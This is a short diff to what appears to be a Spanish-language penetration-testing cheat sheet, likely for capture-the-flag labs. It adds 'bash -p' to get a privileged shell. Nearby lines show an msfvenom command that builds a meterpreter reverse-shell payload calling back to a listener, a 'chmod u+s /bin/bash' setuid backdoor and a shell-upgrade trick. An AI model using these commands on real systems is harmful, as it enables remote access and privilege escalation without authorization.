@@ -94,6 +94,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=443 -f aspx 
 chmod u+s /bin/bash
 
 
+######### bash privilegiada ########
+bash -p
+
 ######## mejorar bash ######## 
 >script /dev/null -c bash
 crtl + z
